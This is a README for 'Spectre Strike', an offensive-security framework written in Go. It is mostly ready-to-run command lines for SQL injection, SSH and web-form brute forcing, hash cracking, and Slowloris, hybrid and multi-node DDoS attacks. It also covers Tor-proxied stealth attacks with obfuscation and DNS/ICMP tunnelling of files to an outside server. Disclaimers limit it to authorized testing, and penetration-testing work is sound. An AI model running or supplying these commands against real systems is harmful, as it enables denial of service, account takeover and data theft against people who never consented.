# 👻 SPECTRE STRIKE - Professional Offensive Security Framework v3.0

[![Go Version](https://img.shields.io/badge/Go-1.24-blue.svg)](https://golang.org/)
[![License](https://img.shields.io/badge/License-Educational-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-green.svg)](https://www.linux.org/)
[![Author](https://img.shields.io/badge/Author-nix--shadow-purple.svg)](https://github.com/nix-shadow)

**ML-Powered Distributed Attack Framework with Intelligent Coordination**

> ⚠️ **LEGAL DISCLAIMER**: This tool is for authorized security testing and educational purposes only. Unauthorized use against systems you don't own or have explicit permission to test is illegal. The authors are not responsible for misuse or damage caused by this tool.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
- [Advanced Features](#advanced-features)
- [Configuration](#configuration)
- [Architecture](#architecture)
- [Development](#development)
- [License](#license)

---

## 🌟 Overview

Spectre Strike is a next-generation distributed offensive security framework authored by **nix-shadow**. Built in Go with machine learning at its core, it combines traditional attack vectors with intelligent worker coordination, adaptive evasion, and real-time performance optimization.

### Key Highlights

- 🧠 **ML-Powered**: Neural networks, reinforcement learning, and anomaly detection
- 🌐 **Multi-Vector**: Web exploitation, password attacks, network scanning, DDoS testing
- 🎯 **Adaptive**: Real-time learning and strategy optimization
- 🚀 **High-Performance**: Multi-threaded Go implementation
- 🛡️ **Evasion**: WAF bypass, stealth mode, traffic obfuscation
- 📊 **Comprehensive**: Detailed reporting and statistics
- 💻 **User-Friendly**: Interactive launcher with presets and favorites

---

## ✨ Features

### 🌐 Web Exploitation

- **Vulnerability Scanner**
  - SQL Injection (Error-based, Union-based, Blind, Time-based)
  - Cross-Site Scripting (XSS) - Reflected, Stored
  - Local/Remote File Inclusion (LFI/RFI)
  - Command Injection (OS command injection)
  - Server-Side Request Forgery (SSRF)
  - Open Redirect
  - Directory Traversal

- **Directory/File Brute Forcer**
  - Wordlist-based discovery
  - Extension testing
  - Multi-threaded scanning
  - Response filtering

### 🔐 Password Attacks

- **Authentication Brute Force**
  - HTTP Basic Authentication
  - HTTP Form-based Authentication (POST/GET)
  - SSH Protocol
  - FTP Protocol
  - CSRF token extraction
  - Cookie management

- **Hash Cracking**
  - MD5, SHA1, SHA256, SHA512
  - Multi-threaded processing
  - Custom wordlists
  - Real-time hash rate display

### 🔍 Network Operations

- **Port Scanner**
  - TCP connect scanning
  - Service detection and version identification
  - Banner grabbing (HTTP, SSH, FTP, SMTP, MySQL, Redis, etc.)
  - Custom port ranges or top-N ports

- **Service Enumeration**
  - Protocol-specific probes
  - HTTP header analysis
  - SSH banner extraction
  - FTP anonymous login detection
  - Database fingerprinting

- **Subnet/Host Discovery**
  - CIDR notation support
  - IP range scanning
  - Reverse DNS lookup

### 🎯 DDoS/Stress Testing

- **Slowloris Attack**: Low-bandwidth HTTP DoS
- **Adaptive Attack**: ML-powered strategy optimization
- **WebSocket Flood**: WebSocket connection exhaustion
- **WAF Bypass**: Header randomization and evasion techniques
- **Hybrid Attack**: Multi-vector simultaneous attacks

### 🕵️ Red Team Operations

- **Advanced Reconnaissance**: Subdomain enumeration, DNS interrogation, port scanning
- **Stealth Operations**: Proxy/SOCKS5 support, traffic obfuscation
- **Command & Control (C2)**: Encrypted communication channels
- **Data Exfiltration**: DNS tunneling, ICMP tunneling, HTTP covert channels
- **Distributed Operations**: Multi-node coordination

### 🧠 Machine Learning Intelligence

- **Neural Networks**: 4-layer perceptron for attack optimization
- **Anomaly Detection**: Statistical z-score based outlier detection
- **Pattern Recognition**: Frequency analysis and pattern caching
- **Reinforcement Learning**: Q-learning for parameter optimization
- **Defense Detection**: WAF, rate limiting, and CDN identification

---

## 🚀 Installation

### Prerequisites

- **Go 1.20+** (Go 1.24+ recommended)
- **Python 3.6+** (for launcher)
- **Git**
- **Linux/macOS** (Windows WSL supported)

### Quick Install

```bash
# Clone the repository
git clone <repository-url>
cd advanced-attack-tool

# Install dependencies
go mod download

# Build the project
go build -o attack ./cmd/main.go

# Or use the build script
chmod +x build.sh
./build.sh

# Make launcher executable
chmod +x launcher.py launcher.sh
```

### Verify Installation

```bash
# Check binary
./attack help

# Run launcher
python3 launcher.py
```

---

## 🎮 Quick Start

### Option 1: Interactive Launcher (Recommended)

```bash
# Python launcher (best experience)
python3 launcher.py

# Or Bash launcher
./launcher.sh
```

The launcher provides:
- ✅ Interactive menus for all features
- 📜 Command history tracking
- ⭐ Favorite commands management
- 🎯 Pre-configured attack presets
- 📊 Statistics dashboard
- 💾 Result export

### Option 2: Direct Command Line

```bash
# Web vulnerability scan
./attack web-scan -target https://example.com -depth medium

# Port scanning
./attack port-scan -target 192.168.1.100 -top-ports 100 -service

# Password brute force
./attack password-brute -target ssh://192.168.1.100 -protocol ssh \
  -users wordlists/usernames.txt -passwords wordlists/passwords.txt

# Hash cracking
./attack hash-crack -hash 5f4dcc3b5aa765d61d8327deb882cf99 -type md5 \
  -wordlist wordlists/passwords.txt
```

### Option 3: Quick Launch Mode

```bash
# Quick command execution
python3 launcher.py --quick

# Direct command mode
python3 launcher.py --command "web-scan -target https://example.com"

# Run favorite
python3 launcher.py --favorite "Quick Web Scan"
```

---

## 📚 Usage

### Launcher Features

#### Main Menu Options

1. **🌐 Web Exploitation** - SQL injection, XSS, LFI, directory brute force
2. **🔐 Password Attacks** - HTTP/SSH/FTP brute force, hash cracking
3. **🔍 Network Operations** - Port scanning, service enumeration, subnet discovery
4. **🎯 DDoS/Stress Testing** - Slowloris, adaptive, WebSocket, WAF bypass, hybrid
5. **🕵️ Red Team Operations** - Recon, stealth, C2, exfiltration, distributed
6. **📚 Documentation** - View help and guides
7. **🔧 Build/Rebuild** - Compile the project
8. **ℹ️ Help** - Show command help
9. **📊 Examples** - Quick example commands
10. **⭐ Favorites** - Manage saved commands
11. **📜 History** - View and re-run command history
12. **🎯 Presets** - Pre-configured attack scenarios
13. **📊 Statistics** - Usage statistics and performance metrics
14. **💾 Export** - Export results and reports (JSON/CSV/TXT)
15. **⚙️ Settings** - Configure launcher behavior
16. **🚀 Quick Launch** - Direct command input
17. **🧪 Benchmark** - System performance test
18. **🔄 Updates** - Check for updates
19. **💻 Direct Command** - Execute raw commands

### Web Exploitation Examples

#### Full Vulnerability Scan

```bash
./attack web-scan -target https://example.com -depth medium -threads 20
```

Options:
- `-target`: Target URL (required)
- `-depth`: light/medium/deep (default: medium)
- `-threads`: Number of threads (default: 10)

#### SQL Injection Testing

```bash
./attack sqli -target "https://example.com/page?id=1" \
  -payloads wordlists/sqli_payloads.txt
```

#### Directory Brute Force

```bash
./attack dir-brute -target https://example.com \
  -wordlist wordlists/directories.txt \
  -threads 20 \
  -extensions php,html,txt \
  -status-codes 200,301,302
```

### Password Attacks Examples

#### HTTP Form Authentication

```bash
./attack password-brute \
  -target https://example.com/login \
  -protocol http-form \
  -login-url https://example.com/login \
  -user-field username \
  -pass-field password \
  -users admin \
  -passwords wordlists/passwords.txt \
  -success-string "Welcome"
```

#### SSH Brute Force

```bash
./attack password-brute \
  -target 192.168.1.100:22 \
  -protocol ssh \
  -users wordlists/usernames.txt \
  -passwords wordlists/passwords.txt \
  -threads 5
```

#### Hash Cracking

```bash
# Single hash
./attack hash-crack \
  -hash 5f4dcc3b5aa765d61d8327deb882cf99 \
  -type md5 \
  -wordlist wordlists/passwords.txt \
  -threads 10

# Multiple hashes from file
./attack hash-crack \
  -hash-file hashes.txt \
  -type sha256 \
  -wordlist wordlists/passwords.txt \
  -threads 10
```

Supported: MD5, SHA1, SHA256, SHA512

### Network Operations Examples

#### Port Scanning

```bash
# Scan specific ports
./attack port-scan -target 192.168.1.100 \
  -ports 22,80,443,3306 -service -threads 50

# Scan port range
./attack port-scan -target 192.168.1.100 \
  -ports 1-1000 -service -threads 50

# Scan top ports
./attack port-scan -target 192.168.1.100 \
  -top-ports 100 -service -threads 50
```

#### Service Enumeration

```bash
./attack service-enum -target 192.168.1.100 \
  -ports 22,80,443,3306,5432,6379,27017
```

Enumerates: HTTP/HTTPS, SSH, FTP, SMTP, MySQL, PostgreSQL, Redis, MongoDB

#### Subnet Scanning

```bash
# CIDR notation
./attack subnet-scan -subnet 192.168.1.0/24 -threads 50

# IP range
./attack subnet-scan -subnet 192.168.1.1-192.168.1.254 -threads 50
```

### DDoS/Stress Testing Examples

⚠️ **WARNING**: Only use on systems you own or have explicit permission to test!

#### Slowloris Attack

```bash
./attack slowloris -target https://example.com \
  -duration 120 -connections 200 -threads 10
```

#### Adaptive ML-Powered Attack

```bash
./attack adaptive -target https://example.com \
  -duration 180 -learn -optimize
```

#### Hybrid Multi-Vector Attack

```bash
./attack hybrid -target https://example.com \
  -duration 180 \
  -vectors slowloris,http2,adaptive \
  -distribution 30,30,40
```

### Red Team Operations Examples

#### Advanced Reconnaissance

```bash
./attack recon -target example.com \
  -ports 1-1000 \
  -subdomains \
  -dns \
  -tech-detect \
  -threads 50
```

#### Stealth Attack Mode

```bash
./attack stealth -target https://example.com \
  -duration 600 \
  -proxy socks5://127.0.0.1:9050 \
  -random-delays \
  -obfuscate
```

#### Data Exfiltration

```bash
# DNS tunneling
./attack exfil -target data.txt \
  -method dns \
  -dns-server ns.example.com

# ICMP tunneling
./attack exfil -target data.txt \
  -method icmp \
  -dest-ip 192.168.1.100
```

#### Distributed Attack

```bash
./attack distributed -target https://example.com \
  -nodes 192.168.1.10,192.168.1.11,192.168.1.12 \
  -duration 300 \
  -sync
```

---

## 🔧 Advanced Features

### Configuration Profiles

Pre-configured profiles in `configs/`:

- **default.json** - Balanced settings for general testing
- **stealth.json** - Low-profile, maximum evasion
- **aggressive.json** - High-performance, direct attacks

Load custom config:
```bash
./attack web-scan -target https://example.com -config configs/stealth.json
```

### Wordlists

Included wordlists in `wordlists/`:

- `directories.txt` - ~70 common web directories
- `passwords.txt` - ~70 common passwords
- `usernames.txt` - ~70 common usernames
- `sqli_payloads.txt` - 100+ SQL injection payloads

### Proxy Support

```bash
# HTTP proxy
./attack web-scan -target https://example.com -proxy http://proxy:8080

# SOCKS5 proxy
./attack web-scan -target https://example.com -proxy socks5://127.0.0.1:9050

# Proxy list (rotate)
./attack web-scan -target https://example.com \
  -proxy-file proxies.txt -proxy-rotate
```

### Output and Reporting

```bash
# JSON output
./attack port-scan -target 192.168.1.100 \
  -output results.json -format json

# CSV output
./attack port-scan -target 192.168.1.100 \
  -output results.csv -format csv

# Verbose logging
./attack web-scan -target https://example.com -verbose -debug
```

---

## 🏗️ Architecture

### Project Structure

```
advanced-attack-tool/
├── cmd/
│   └── main.go                 # Entry point
├── pkg/
│   ├── attacks/                # Attack implementations
│   │   ├── adaptive.go         # ML-powered adaptive attacks
│   │   ├── hybrid.go           # Multi-vector attacks
│   │   ├── slowloris.go        # Slowloris implementation
│   │   ├── waf_bypass.go       # WAF evasion
│   │   └── websocket.go        # WebSocket attacks
│   ├── exploitation/           # Exploitation modules
│   │   ├── web_scanner.go      # Web vulnerability scanner
│   │   └── password.go         # Password attacks
│   ├── intelligence/           # ML intelligence
│   │   └── ml.go               # Neural networks, RL, anomaly detection
│   ├── network/                # Network operations
│   │   └── scanner.go          # Port scanning, service enum
│   ├── redteam/                # Red team operations
│   │   ├── c2.go               # Command & Control
│   │   ├── distributed.go      # Distributed attacks
│   │   ├── recon.go            # Advanced recon
│   │   └── stealth.go          # Stealth operations
│   ├── utils/                  # Utilities
│   │   ├── evasion.go          # Evasion techniques
│   │   ├── request.go          # HTTP utilities
│   │   └── tls_profiles.go     # TLS fingerprints
│   └── waf/                    # WAF detection/bypass
├── configs/                    # Configuration files
├── wordlists/                  # Attack wordlists
├── launcher.py                 # Python interactive launcher
├── launcher.sh                 # Bash interactive launcher
└── README.md                   # This file
```

### Core Components

- **Attack Coordinator**: Manages multiple attack vectors and synchronization
- **ML Intelligence Engine**: Neural networks, reinforcement learning, anomaly detection
- **Evasion System**: Header randomization, TLS variation, traffic obfuscation
- **Reporting System**: Real-time statistics, multiple output formats

---

## 🛠️ Development

### Building from Source

```bash
# Standard build
go build -o attack ./cmd/main.go

# Optimized build
go build -ldflags="-s -w" -o attack ./cmd/main.go

# Cross-platform builds
GOOS=linux GOARCH=amd64 go build -o attack-linux ./cmd/main.go
GOOS=darwin GOARCH=amd64 go build -o attack-macos ./cmd/main.go
```

### Running Tests

```bash
# Run all tests
go test ./...

# Run with coverage
go test -cover ./...

# Benchmark tests
go test -bench=. ./...
```

### Adding New Features

1. Create module in appropriate `pkg/` subdirectory
2. Implement interface or extend existing functionality
3. Add command in `cmd/main.go`
4. Update documentation
5. Add tests

---
## 👤 Author

**nix-shadow** - Offensive Security Researcher & Tool Developer

---
## 📄 License

This project is licensed for **Educational and Authorized Security Testing Only**.

### Terms of Use

- ✅ Authorized penetration testing
- ✅ Security research and education
- ✅ Lab environments and CTF challenges
- ❌ Unauthorized access or attacks
- ❌ Malicious purposes
- ❌ Illegal activities

**By using this tool, you agree to use it responsibly and ethically.**

---

## 🔐 Security Notice

- Don't share credentials or sensitive data
- Use strong passwords for C2 servers
- Encrypt communications in production
- Store logs securely
- Follow responsible disclosure practices

---

## 📈 Performance Benchmarks

On modern system (8-core CPU, 16GB RAM):

- **Hash Cracking**: ~150,000 MD5/sec (10 threads)
- **Port Scanning**: ~1,000 ports/sec (TCP connect)
- **Web Requests**: ~5,000 requests/sec (no rate limiting)
- **Directory Brute Force**: ~200 paths/sec (20 threads)

---

## 🎓 Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [HackTheBox](https://www.hackthebox.eu/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Penetration Testing Execution Standard](http://www.pentest-standard.org/)

---

## ⚠️ Final Warning

**This is a powerful tool. Use it responsibly.**

Always:
- Obtain written permission
- Stay within scope
- Document your activities
- Report findings professionally
- Follow laws and regulations

**Unauthorized hacking is a crime. Be ethical. Be legal. Be professional.**

---

**Made with 💜 for Security Professionals**

**Version**: 3.0 ULTIMATE | **Updated**: December 2025
